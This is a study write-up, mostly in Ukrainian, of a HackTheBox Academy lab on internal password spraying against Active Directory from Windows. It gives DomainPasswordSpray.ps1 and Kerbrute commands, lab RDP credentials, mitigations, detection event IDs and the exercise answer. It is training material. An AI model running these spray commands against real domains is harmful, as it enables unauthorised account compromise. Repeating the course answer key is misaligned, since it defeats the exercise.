# Internal Password Spraying - from Windows

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1422](https://academy.hackthebox.com/app/module/143/section/1422) |

---

## 🔑 Ключові команди

### DomainPasswordSpray.ps1 — автоматичний spray

```powershell
# Імпорт модуля (знаходиться у C:\Tools)
cd C:\Tools
Import-Module .\DomainPasswordSpray.ps1

# Spray — інструмент сам генерує user list з AD
# Автоматично враховує password policy і виключає акаунти близькі до lockout
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue

# Spray зі своїм списком (якщо не автентифікований у домені)
Invoke-DomainPasswordSpray -UserList users.txt -Password Welcome1 -OutFile spray_success
```

> 💡 Інструмент автоматично:
> - Витягує список юзерів з AD
> - Перевіряє password policy
> - Виключає акаунти в межах 1 спроби до lockout

---

### Kerbrute — spray з Windows

```powershell
# Kerbrute також доступний у C:\Tools
.\kerbrute_windows_amd64.exe passwordspray -d inlanefreight.local --dc 172.16.5.5 users.txt Welcome1
```

---

## 🛡️ Mitigations

| Техніка | Опис |
|---------|------|
| **MFA** | Значно знижує ризик навіть при правильному паролі |
| **Restricting Access** | Principle of least privilege — обмежити доступ до застосунків |
| **Separate admin accounts** | Привілейовані юзери мають окремий адмін-акаунт |
| **Password Hygiene** | Passphrases, password filter (заборона словникових слів) |
| **LAPS** | Унікальні паролі локального адміна на кожному хості |

---

## 🔍 Detection

| Event ID | Опис |
|----------|------|
| `4625` | Failed logon — багато за короткий час = spray через SMB |
| `4771` | Kerberos pre-auth failed — spray через LDAP/Kerberos |

---

## 🌐 External Password Spraying targets

```
Microsoft 0365 / OWA / Exchange Web Access
Skype for Business / Lync
RDS / Citrix portals
VPN portals (SonicWall, Fortinet, OpenVPN)
Custom web apps з AD auth
```

---

## ❓ Questions

### Q1 — Юзер з паролем Winter2022

> **Using the examples shown in this section, find a user with the password Winter2022. Submit the username as the answer.**

**Steps:**

```powershell
# RDP до Windows attack host
# IP: ACADEMY-EA-MS01 | user: htb-student | pass: Academy_student_AD!

cd C:\Tools
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Winter2022 -OutFile spray_success -ErrorAction SilentlyContinue

# Результат:
# [*] SUCCESS! User:dbranch Password:Winter2022
```

**Answer:** `dbranch`
